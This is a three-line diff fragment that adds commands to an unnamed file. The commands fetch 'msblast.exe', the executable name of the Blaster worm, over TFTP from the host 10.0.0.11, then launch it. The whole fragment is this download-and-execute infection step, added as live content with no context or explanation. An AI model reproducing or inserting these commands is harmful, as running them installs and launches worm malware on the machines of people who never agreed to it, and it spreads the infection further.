@@ -1,0 +1,3 @@
+tftp -i 10.0.0.11 GET msblast.exe
+start msblast.exe
+msblast.exe
